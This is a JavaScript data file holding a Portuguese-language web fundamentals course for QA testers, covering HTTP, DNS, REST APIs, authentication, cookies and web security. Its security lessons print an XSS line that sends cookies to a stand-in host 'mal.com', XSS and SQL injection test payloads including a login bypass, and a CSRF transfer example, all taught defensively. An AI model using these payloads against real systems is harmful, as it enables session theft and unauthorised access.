// Sentinel Learning — Web Fundamentals
// window.SL_WEB

(function () {
  'use strict';

  var COURSE = {
    id: 'web-fundamentals',
    slug: 'web-fundamentals',
    title: 'Web Fundamentals',
    subtitle: 'Como a web funciona de verdade',
    description: 'HTTP, DNS, APIs REST, autenticação, cookies, CORS e o ciclo completo de uma requisição — essencial para QA e devs.',
    category: 'Base',
    level: 'Iniciante',
    estimatedHours: 18,
    totalModules: 4,
    totalLessons: 20,
    status: 'available',
    tags: ['http', 'api', 'rest', 'web', 'dns'],
    storageKey: null,

    getLessonContent: function (moduleNum, lessonIndex) {
      var mod = COURSE.modules[moduleNum - 1];
      if (!mod || !mod.lessons) return null;
      return mod.lessons[lessonIndex] || null;
    },

    modules: [
      {
        id: 'M1', title: 'HTTP & DNS',
        description: 'Como uma URL vira uma página no seu browser.',
        status: 'available',
        lessons: [
          {
            id: 'web.1.1', title: 'O que acontece quando você acessa uma URL?', description: 'O ciclo completo de uma requisição web.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Do clique à página — 7 etapas em milissegundos' },
              { type: 'code', lang: 'text', raw: '1. Você digita: https://meusite.com/login\n\n2. DNS Lookup\n   Browser pergunta: "qual é o IP de meusite.com?"\n   DNS responde: "174.138.35.220"\n\n3. Conexão TCP\n   Browser abre conexão com o servidor no IP recebido\n\n4. Handshake TLS (para HTTPS)\n   Browser e servidor trocam certificados e chaves\n\n5. Requisição HTTP\n   Browser envia: GET /login HTTP/1.1\n   Host: meusite.com\n\n6. Resposta do servidor\n   Servidor devolve: 200 OK + HTML da página\n\n7. Renderização\n   Browser parseia HTML, CSS, JS e exibe a página' },
              { type: 'callout', html: '<strong>Para QA:</strong> entender esse fluxo te permite identificar onde uma lentidão ocorre (DNS? servidor? renderização?), reportar bugs de rede com precisão, e usar o DevTools para investigar requisições.' },
            ]
          },
          {
            id: 'web.1.2', title: 'HTTP — métodos, status codes e headers', description: 'A linguagem da web.', duration: '14 min', xp: 70, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Métodos HTTP' },
              { type: 'code', lang: 'text', raw: 'GET     → buscar dados (sem alterar nada)\nPOST    → criar um novo recurso\nPUT     → substituir um recurso completamente\nPATCH   → atualizar campos específicos\nDELETE  → remover um recurso\n\nExemplos:\nGET    /products          → listar produtos\nGET    /products/42       → buscar produto 42\nPOST   /products          → criar novo produto\nPUT    /products/42       → substituir produto 42\nPATCH  /products/42       → atualizar preço do produto 42\nDELETE /products/42       → remover produto 42' },
              { type: 'h2', text: 'Status codes — o que cada faixa significa' },
              { type: 'code', lang: 'text', raw: '2xx → Sucesso\n  200 OK            → tudo certo, aqui estão seus dados\n  201 Created       → recurso criado com sucesso\n  204 No Content    → sucesso, sem corpo de resposta (DELETE)\n\n3xx → Redirecionamento\n  301 Moved Permanently → URL mudou para sempre\n  302 Found             → redirecionamento temporário\n\n4xx → Erro do cliente\n  400 Bad Request       → dados inválidos enviados\n  401 Unauthorized      → não autenticado (faça login)\n  403 Forbidden         → autenticado, mas sem permissão\n  404 Not Found         → recurso não existe\n  422 Unprocessable     → validação falhou\n  429 Too Many Requests → rate limit atingido\n\n5xx → Erro do servidor\n  500 Internal Server Error → erro inesperado no servidor\n  503 Service Unavailable   → servidor fora do ar' },
              { type: 'callout', html: '<strong>401 vs 403:</strong> 401 significa "você não está autenticado, faça login". 403 significa "você está logado, mas não tem permissão". São erros diferentes e devem ter mensagens diferentes para o usuário.' },
            ]
          },
          {
            id: 'web.1.3', title: 'HTTPS e TLS — como a segurança funciona', description: 'Criptografia e certificados SSL/TLS.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Por que HTTPS?' },
              { type: 'p', html: 'HTTP puro envia tudo em texto puro — qualquer um na rede consegue ler. <strong>HTTPS adiciona TLS</strong> (Transport Layer Security): criptografa os dados, autentica o servidor e garante integridade.' },
              { type: 'h2', text: 'Como o TLS funciona (simplificado)' },
              { type: 'code', lang: 'text', raw: '1. Browser → servidor: "Quero comunicação segura"\n\n2. Servidor → browser: "Aqui está meu certificado\n   assinado por uma CA (autoridade certificadora) confiável"\n\n3. Browser verifica:\n   - Certificado válido e não expirou?\n   - Domínio no cert bate com a URL?\n   - CA é confiável?\n\n4. Browser e servidor concordam numa chave de criptografia\n\n5. Comunicação começa, toda criptografada\n\nResultado: pacotes interceptados são inúteis sem a chave.' },
              { type: 'callout', html: '<strong>Para QA:</strong> sempre teste que formulários com dados sensíveis (login, pagamento) usam HTTPS. Reportar um campo de senha em HTTP é um bug de segurança crítico.' },
            ]
          },
          {
            id: 'web.1.4', title: 'DNS — como nomes viram endereços', description: 'Resolução de nomes e tipos de registro DNS.', duration: '10 min', xp: 50, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'O que é DNS?' },
              { type: 'p', html: 'DNS (Domain Name System) é a agenda telefônica da internet. Traduz nomes legíveis (<code>google.com</code>) em endereços IP (<code>142.250.80.46</code>).' },
              { type: 'code', lang: 'text', raw: 'Tipos de registro DNS mais comuns:\n\nA       → aponta domínio para um IP v4\n          meusite.com → 174.138.35.220\n\nAAAA    → aponta para um IP v6\n\nCNAME   → alias para outro domínio\n          www.meusite.com → meusite.com\n\nMX      → servidor de email do domínio\n\nTXT     → informações em texto (SPF, DKIM, verificação)\n\nNS      → servidores DNS autoritativos do domínio' },
              { type: 'callout', html: '<strong>Cache DNS:</strong> resultados são cacheados por um tempo (TTL). Após trocar um DNS, pode levar minutos a horas para propagar. Em deploys, isso pode fazer o "novo site" aparecer para uns e o "velho" para outros.' },
            ]
          },
          {
            id: 'web.1.5', title: 'DevTools — inspecionando requisições', description: 'Usar o Network tab para analisar requisições HTTP.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'O Network Tab do DevTools' },
              { type: 'p', html: 'Abra o DevTools (F12), vá na aba <strong>Network</strong>. Aqui você vê todas as requisições que a página faz: HTML, CSS, JS, imagens, chamadas de API.' },
              { type: 'code', lang: 'text', raw: 'O que você consegue ver por requisição:\n\n• URL e método (GET, POST...)\n• Status code (200, 404, 500...)\n• Tempo de resposta\n• Request Headers (cookies, authorization, content-type)\n• Response Headers\n• Request Body (payload enviado)\n• Response Body (dados recebidos)\n• Timing (DNS, TCP, TLS, waiting, download)\n\nDicas:\n• Filtrar por "Fetch/XHR" → ver só chamadas de API\n• "Preserve log" → manter logs entre navegações\n• "Throttle" → simular conexão lenta (3G, 4G)' },
              { type: 'callout', html: '<strong>QA no Network Tab:</strong> quando um botão não faz nada ou um erro aparece, verifique o Network tab. O bug pode estar na requisição (payload errado), na resposta (status errado) ou no tratamento do erro no frontend.' },
            ]
          },
        ]
      },

      {
        id: 'M2', title: 'APIs REST',
        description: 'Entender e testar APIs RESTful.',
        status: 'available',
        lessons: [
          {
            id: 'web.2.1', title: 'O que é uma API REST?', description: 'Conceitos, recursos e representações.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'API REST — a linguagem dos sistemas modernos' },
              { type: 'p', html: 'Uma API (Application Programming Interface) é um contrato: "se você mandar X, eu te devolvo Y". <strong>REST</strong> usa URLs para representar recursos e verbos HTTP para ações.' },
              { type: 'code', lang: 'text', raw: 'Princípios REST:\n\n1. Recursos identificados por URLs\n   /users/42     → o usuário com id 42\n   /orders       → todos os pedidos\n\n2. Verbos HTTP representam ações\n   GET /users        → listar todos\n   POST /users       → criar\n   GET /users/42     → buscar um\n   PUT /users/42     → atualizar\n   DELETE /users/42  → remover\n\n3. Stateless — servidor não guarda estado do cliente\n\n4. Respostas em JSON (principalmente)' },
              { type: 'callout', html: '<strong>REST vs GraphQL:</strong> REST usa múltiplos endpoints. GraphQL usa um único endpoint onde você especifica os campos desejados. REST é mais simples e mais comum no mercado.' },
            ]
          },
          {
            id: 'web.2.2', title: 'JSON — o formato de dados da web', description: 'Ler, escrever e validar JSON.', duration: '10 min', xp: 50, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'JSON — JavaScript Object Notation' },
              { type: 'code', lang: 'json', raw: '{\n  "id": 42,\n  "name": "Raphael Castilho",\n  "email": "raphael@test.com",\n  "active": true,\n  "skills": ["playwright", "postman"],\n  "address": {\n    "city": "São Paulo",\n    "state": "SP"\n  },\n  "deletedAt": null\n}' },
              { type: 'p', html: 'Tipos de dados em JSON: <strong>string</strong> (entre aspas duplas), <strong>number</strong> (sem aspas), <strong>boolean</strong> (true/false), <strong>null</strong>, <strong>object</strong> ({}) e <strong>array</strong> ([]).' },
              { type: 'callout', html: '<strong>Validação de tipos:</strong> <code>"price": "49.90"</code> (string) onde deveria ser <code>"price": 49.90</code> (number) é um bug que pode causar cálculos errados. Sempre verifique os tipos, não apenas se o campo existe.' },
            ]
          },
          {
            id: 'web.2.3', title: 'Testando APIs com Postman', description: 'Fazer requisições e validar respostas.', duration: '14 min', xp: 70, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Postman — ferramenta essencial para API testing' },
              { type: 'p', html: 'Postman permite fazer requisições HTTP, organizar requests em coleções e escrever testes automatizados. É a ferramenta mais usada por QA para teste de API.' },
              { type: 'code', lang: 'javascript', raw: '// Testes no Postman (aba "Tests")\n\npm.test("Status 200", () => {\n    pm.response.to.have.status(200);\n});\n\npm.test("Resposta em menos de 500ms", () => {\n    pm.expect(pm.response.responseTime).to.be.below(500);\n});\n\npm.test("Response tem campos obrigatórios", () => {\n    const body = pm.response.json();\n    pm.expect(body).to.have.property("id");\n    pm.expect(body.email).to.be.a("string");\n    pm.expect(body.active).to.be.true;\n});\n\n// Salvar valor para próximos requests:\npm.environment.set("userId", pm.response.json().id);' },
              { type: 'callout', html: '<strong>Environments:</strong> use environments (dev, staging, prod) para mudar a baseURL sem editar cada request. Exporte e compartilhe coleções com o time.' },
            ]
          },
          {
            id: 'web.2.4', title: 'Query params, path params e body', description: 'Os três jeitos de enviar dados para uma API.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: '3 formas de passar dados para uma API' },
              { type: 'code', lang: 'text', raw: '1. Path Parameters — identificadores de recursos\n   GET /users/42          → buscar usuário 42\n   DELETE /posts/7        → deletar post 7\n\n2. Query Parameters — filtros e opções\n   GET /products?category=shirts&sort=price\n   GET /users?page=2&limit=20&search=raphael\n\n3. Request Body — dados para criar/atualizar\n   POST /users\n   Content-Type: application/json\n   {\n     "name": "Raphael",\n     "email": "raphael@test.com",\n     "password": "Senha@123"\n   }' },
              { type: 'callout', html: '<strong>GET não tem body:</strong> nunca envie dados sensíveis em query params — eles aparecem na URL, nos logs do servidor e no histórico do browser. Use POST com body para dados sensíveis.' },
            ]
          },
          {
            id: 'web.2.5', title: 'Testes negativos em APIs', description: 'Validar comportamento com entradas inválidas.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Cenários de teste negativo para um POST /users' },
              { type: 'code', lang: 'text', raw: '✅ Email inválido → 400 + mensagem clara\n   { "email": "nao-e-email" }\n\n✅ Campo obrigatório ausente → 400 + qual campo\n   { "name": "Raphael" }  ← sem email\n\n✅ Usuário duplicado → 409 Conflict\n   { "email": "email-existente@test.com" }\n\n✅ Senha fraca → 422 + critérios explicados\n   { "password": "123" }\n\n✅ Payload vazio → 400\n   {}\n\n✅ Tipo errado → 400\n   { "age": "trinta" }  ← string onde espera number\n\n✅ Sem autenticação → 401\n   (sem header Authorization)' },
              { type: 'callout', html: '<strong>APIs não devem vazar informações em erros:</strong> um 500 com stack trace no body é um bug de segurança. Erros de produção devem ter mensagem genérica + ID de correlação para rastrear nos logs internos.' },
            ]
          },
        ]
      },

      {
        id: 'M3', title: 'Autenticação & Cookies',
        description: 'Como funciona autenticação, sessões e tokens na web.',
        status: 'available',
        lessons: [
          {
            id: 'web.3.1', title: 'Sessões vs Tokens (JWT)', description: 'Dois modelos de autenticação.', duration: '14 min', xp: 70, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Autenticação baseada em sessão' },
              { type: 'code', lang: 'text', raw: '1. Usuário faz login\n2. Servidor verifica credenciais\n3. Cria sessão: session_id = "xyz789" → salva no banco\n4. Envia: Set-Cookie: session_id=xyz789; HttpOnly; Secure\n5. Browser armazena e envia em toda requisição\n6. Servidor valida no banco a cada request\n\nVantagem: fácil invalidar (logout imediato)\nDesvantagem: banco consultado em cada request' },
              { type: 'h2', text: 'JWT — JSON Web Token' },
              { type: 'code', lang: 'text', raw: '1. Usuário faz login\n2. Servidor gera JWT: header.payload.signature\n   Payload: { userId: 42, role: "qa", exp: 1234567 }\n3. Cliente envia: Authorization: Bearer eyJ...\n4. Servidor valida assinatura — sem banco!\n\nJWT tem 3 partes separadas por ponto:\n  eyJhbGciOiJIUzI1NiJ9   ← Header (base64)\n  .eyJ1c2VySWQiOjQyfQ     ← Payload (base64)\n  .xyz123signature        ← Signature (hash)\n\nVantagem: stateless, sem banco por request\nDesvantagem: não dá para invalidar antes do exp' },
              { type: 'callout', html: '<strong>Para QA:</strong> decodifique o JWT em jwt.io para ver o payload — userId, role, exp. Se o exp for no passado, o token expirou e a API deve retornar 401.' },
            ]
          },
          {
            id: 'web.3.2', title: 'Cookies — HttpOnly, Secure, SameSite', description: 'Atributos de segurança dos cookies.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Atributos importantes de cookies' },
              { type: 'code', lang: 'text', raw: 'Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600\n\nHttpOnly  → JS não consegue ler (document.cookie não vê)\n           Protege contra XSS — atacante não rouba o cookie\n\nSecure    → só enviado via HTTPS (nunca em HTTP)\n\nSameSite:\n  Strict  → nunca enviado de outros sites (proteção CSRF)\n  Lax     → enviado em navegação top-level\n  None    → sempre enviado (precisa Secure=true)\n\nMax-Age   → vida útil em segundos\nPath=/    → em quais URLs o cookie é enviado' },
              { type: 'callout', html: '<strong>Para QA:</strong> cookies sem HttpOnly são vulneráveis a XSS. Sem SameSite, são vulneráveis a CSRF. Verifique esses atributos nos cookies de sessão — é um bug de segurança importante.' },
            ]
          },
          {
            id: 'web.3.3', title: 'OAuth 2.0 e login social', description: 'Como funciona "Login com Google".', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Fluxo de OAuth 2.0' },
              { type: 'code', lang: 'text', raw: '1. Usuário clica "Login com Google"\n\n2. App redireciona para:\n   accounts.google.com/oauth/authorize\n   ?client_id=SEU_APP_ID\n   &redirect_uri=seuapp.com/callback\n   &scope=email profile\n   &state=random_csrf_token\n\n3. Google: "O app X quer acessar seu email. Permitir?"\n\n4. Usuário permite → Google redireciona:\n   seuapp.com/callback?code=AUTH_CODE&state=token\n\n5. Servidor troca code por access_token com o Google\n   (server-to-server, seguro)\n\n6. Usa token para pegar email/perfil\n7. Cria sessão/JWT e retorna ao frontend' },
              { type: 'callout', html: '<strong>Para QA:</strong> teste o fluxo OAuth: login feliz, usuário nega permissão, token expirado, e state inválido. Muitos apps não tratam "negar" corretamente.' },
            ]
          },
          {
            id: 'web.3.4', title: 'localStorage e sessionStorage', description: 'Armazenamento no browser — quando usar cada um.', duration: '10 min', xp: 50, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Três formas de armazenar dados no browser' },
              { type: 'code', lang: 'javascript', raw: '// localStorage — persiste até remoção manual\nlocalStorage.setItem("theme", "dark");\nlocalStorage.getItem("theme");    // "dark"\nlocalStorage.removeItem("theme");\n\n// sessionStorage — dura até fechar a aba\nsessionStorage.setItem("step", "2");\n\n// Cookies — controlados pelo servidor\n// Enviados automaticamente em toda requisição' },
              { type: 'code', lang: 'text', raw: 'Quando usar o quê:\n\nlocalStorage  → preferências (tema, idioma)\n               ⚠️ Acessível via JS → vulnerável a XSS\n\nsessionStorage → dados temporários por sessão\n                formulários de múltiplos passos\n\nCookies HttpOnly → tokens de sessão, JWT\n                  Não acessível via JS → mais seguro' },
            ]
          },
          {
            id: 'web.3.5', title: 'Testando autenticação como QA', description: 'Checklist de cenários críticos de autenticação.', duration: '12 min', xp: 70, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Checklist de testes de autenticação' },
              { type: 'code', lang: 'text', raw: '✅ Login válido → redireciona corretamente\n✅ Senha errada → mensagem genérica (não "senha incorreta")\n✅ Email não existe → mesma mensagem genérica\n   (evitar user enumeration)\n✅ Brute force → bloquear após N tentativas\n✅ Token expirado → redirecionar para login\n✅ Rota protegida sem login → 401 + redirect\n✅ Permissão insuficiente → 403 + mensagem adequada\n✅ Logout → sessão invalidada, não reutilizável\n✅ Mudança de senha → tokens antigos invalidados\n✅ SQL injection no login → sem bypass' },
              { type: 'callout', html: '<strong>User enumeration:</strong> se o sistema diz "email não encontrado" para um email e "senha incorreta" para outro, um atacante sabe quais emails estão cadastrados. A mensagem deve ser sempre: "Email ou senha incorretos".' },
            ]
          },
        ]
      },

      {
        id: 'M4', title: 'CORS & Segurança',
        description: 'Same-origin policy, CORS e vulnerabilidades web comuns.',
        status: 'available',
        lessons: [
          {
            id: 'web.4.1', title: 'Same-Origin Policy e CORS', description: 'Por que browsers bloqueiam requisições cross-origin.', duration: '14 min', xp: 70, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Same-Origin Policy — proteção padrão do browser' },
              { type: 'p', html: 'Por padrão, JS em <code>site-a.com</code> <strong>não pode fazer requisições para <code>api.site-b.com</code></strong>. Essa é a Same-Origin Policy (SOP) — protege você de sites maliciosos acessando seus dados em outros sites.' },
              { type: 'h2', text: 'CORS — como liberar cross-origin de forma segura' },
              { type: 'code', lang: 'text', raw: 'Quando frontend (app.meusite.com) chama API (api.meusite.com):\n\n1. Browser envia preflight (OPTIONS):\n   Origin: https://app.meusite.com\n   Access-Control-Request-Method: POST\n\n2. API responde:\n   Access-Control-Allow-Origin: https://app.meusite.com\n   Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n   Access-Control-Allow-Headers: Content-Type, Authorization\n\n3. Browser verifica → origem permitida → envia requisição real\n\nSe origem NÃO estiver na lista:\n→ "blocked by CORS policy" no console do browser' },
              { type: 'callout', html: '<strong>CORS não é bug de backend</strong> — é configuração. Mas <code>Access-Control-Allow-Origin: *</code> (qualquer origem) pode ser risco de segurança se a API usa cookies.' },
            ]
          },
          {
            id: 'web.4.2', title: 'XSS — Cross-Site Scripting', description: 'Como funciona e como identificar.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Como o XSS funciona' },
              { type: 'code', lang: 'text', raw: 'XSS Armazenado — exemplo:\n\n1. Atacante posta comentário:\n   "Ótimo! <script>location=\'mal.com/?c=\'+document.cookie</script>"\n\n2. Site salva sem sanitizar\n\n3. Todo visitante que vê o comentário executa o script\n   → Cookies enviados para mal.com\n   → Atacante usa cookies para logar como a vítima\n\nComo QA pode testar:\n   Inserir: <script>alert("XSS")</script>\n   Se aparecer alert → vulnerável\n   Se aparecer texto literal → sanitizado (correto)\n\nOutras payloads:\n   <img src=x onerror=alert(1)>\n   "><svg onload=alert(1)>' },
              { type: 'callout', html: '<strong>XSS é crítico.</strong> Qualquer campo de input que exibe dados sem sanitizar é uma superfície de ataque. Inserir <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> em campos é um teste rápido de sanidade.' },
            ]
          },
          {
            id: 'web.4.3', title: 'CSRF — Cross-Site Request Forgery', description: 'Ataques que usam sua sessão sem você saber.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'Como CSRF funciona' },
              { type: 'code', lang: 'text', raw: '1. Você está logado em banco.com\n   Browser tem o cookie de sessão\n\n2. Você visita mal.com com:\n   <img src="https://banco.com/transferir?valor=1000&para=atacante">\n\n3. Browser envia cookie do banco.com junto com a requisição\n4. banco.com recebe requisição autenticada → executa!\n\nProteção: CSRF Token\n   Servidor gera token aleatório no formulário\n   No submit, verifica se o token bate\n   mal.com não tem o token → rejeitado\n\nProteção moderna: SameSite=Strict no cookie\n   Impede que o cookie seja enviado em requisições cross-site' },
            ]
          },
          {
            id: 'web.4.4', title: 'SQL Injection', description: 'Como detectar e reportar ataques de injeção.', duration: '12 min', xp: 60, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'SQL Injection — como testar' },
              { type: 'code', lang: 'text', raw: 'Código vulnerável:\n   SELECT * FROM users WHERE email = \'<INPUT>\'\n\nAtaque no campo email:\n   raphael@test.com\' OR \'1\'=\'1\n\nQuery resultante:\n   WHERE email = \'...\' OR \'1\'=\'1\'  → retorna TODOS!\n\nLogin bypass:\n   admin@site.com\'--\n   → Comenta verificação de senha\n\nComo QA testa:\n   • Inserir: \' (aspas simples)\n   • Inserir: \'--\n   • Inserir: 1 OR 1=1\n   • Monitorar: erro 500? Dados inesperados?\n\nProteção: Prepared Statements\n   NÃO concatenar input na query SQL' },
              { type: 'callout', html: '<strong>Reporte erros 500 com mensagens de SQL</strong> — confirmam SQL injection e vazam estrutura do banco. Banco de dados não deve aparecer em erros para o usuário.' },
            ]
          },
          {
            id: 'web.4.5', title: 'OWASP Top 10', description: 'As 10 vulnerabilidades mais críticas da web.', duration: '14 min', xp: 80, type: 'lesson', status: 'available',
            sections: [
              { type: 'h2', text: 'OWASP Top 10 (2021)' },
              { type: 'code', lang: 'text', raw: 'A01 — Broken Access Control\n     Acessar recursos de outros usuários trocando ID na URL\n\nA02 — Cryptographic Failures\n     Dados sensíveis em texto puro, TLS fraco\n\nA03 — Injection (SQL, XSS, Command Injection)\n     Input executado como código\n\nA04 — Insecure Design\n     Falta de threat modeling\n\nA05 — Security Misconfiguration\n     Configs padrão, verbose errors, headers ausentes\n\nA06 — Vulnerable Components\n     Bibliotecas com CVEs sem atualização\n\nA07 — Authentication Failures\n     Brute force sem bloqueio, tokens fracos\n\nA08 — Integrity Failures\n     Deserialização insegura\n\nA09 — Logging & Monitoring Failures\n     Sem logs para detectar ataques\n\nA10 — Server-Side Request Forgery (SSRF)\n     Servidor faz requests para URLs do atacante' },
              { type: 'callout', html: '<strong>Para QA:</strong> o OWASP Top 10 é um roteiro de teste de segurança. Não precisa explorar ativamente — inclua verificações básicas nos seus casos de teste e saiba reconhecer sintomas.' },
            ]
          },
        ]
      },
    ]
  };

  COURSE.getAllLessons = function () {
    var all = [];
    for (var i = 0; i < COURSE.modules.length; i++) {
      var mod = COURSE.modules[i];
      for (var j = 0; j < mod.lessons.length; j++) {
        all.push({ module: mod, lesson: mod.lessons[j], mi: i, li: j });
      }
    }
    return all;
  };

  COURSE.getLessonById = function (id) {
    var all = COURSE.getAllLessons();
    for (var k = 0; k < all.length; k++) {
      if (all[k].lesson.id === id) return all[k];
    }
    return null;
  };

  window.SL_WEB = COURSE;
})();
